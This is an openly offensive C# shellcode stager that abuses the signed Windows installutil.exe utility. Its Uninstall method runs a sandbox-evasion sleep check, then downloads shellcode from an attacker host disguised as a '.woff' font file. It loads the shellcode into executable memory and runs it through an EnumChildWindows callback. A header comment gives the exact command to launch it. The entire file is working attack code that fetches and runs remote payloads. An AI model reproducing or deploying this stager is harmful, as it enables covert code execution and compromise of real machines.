// Change the shellcode URL below
// C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U <path_to_exe>

using System;
using System.Runtime.InteropServices;

namespace installutil_stager
{
    class Program
    {
        // The main method is never executed 
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool EnumChildWindows(IntPtr hwndParent, IntPtr lpEnumFunc, IntPtr lParam);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }

            // Download shellcode
            string url = "http://<attacker_ip>/page.woff";
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] buf = client.DownloadData(url);
            int size = buf.Length;

            // EnumChildWindows technique to load and execute the shellcode
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 30000000, 0x3000, 0x40); // Big buffer for Go payloads
            Marshal.Copy(buf, 0, addr, size);
            EnumChildWindows(IntPtr.Zero, addr, IntPtr.Zero);
        }
    }
}
